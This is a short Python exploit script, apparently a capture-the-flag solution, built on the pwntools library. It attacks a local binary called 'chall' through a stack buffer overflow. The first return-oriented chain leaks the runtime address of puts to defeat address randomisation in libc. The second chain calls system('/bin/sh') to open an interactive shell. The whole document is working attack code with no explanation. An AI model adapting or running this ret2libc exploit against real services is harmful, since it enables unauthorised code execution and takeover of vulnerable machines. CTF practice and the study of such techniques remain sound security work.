from pwn import * 

context.arch="x86_64"

def main():

    HOST = "localhost"
    PORT = 9020
    elf = ELF("./chall")
    libc = ELF("./libc.so.6")
    local = False 

    if local:
        p = process("./chall")
    else:
        p = remote(HOST, PORT)

    #first step: leak libc address
    offset = 24
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_func = elf.symbols['main']

    pop_rdi = 0x0000000000401283
    ret = 0x000000000040101a

    payload = b'A' * offset 
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main_func)

    p.sendline(payload)
    p.recvline()
    p.recvline()
    p.recvline()
    libc_leak = p.recvline().rstrip().ljust(8, b'\x00')
    libc_leak = u64(libc_leak)

    log.info(f"Puts at libc: {hex(libc_leak)}")

    libc.address = libc_leak - 0x625a0
    log.info(f"libc base: {hex(libc.address)}")
    system_addr = libc_leak - 0x32190
    bin_sh = libc.address + 0x1925aa
    log.info(f"System : {hex(system_addr)}")
    log.info(f"/bin/sh: {hex(bin_sh)}")

    #second step pop a shell
    payload = flat(

        b'A' * offset, 
        p64(ret),
        p64(pop_rdi),
        p64(bin_sh),
        p64(system_addr)
    )

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":

    main()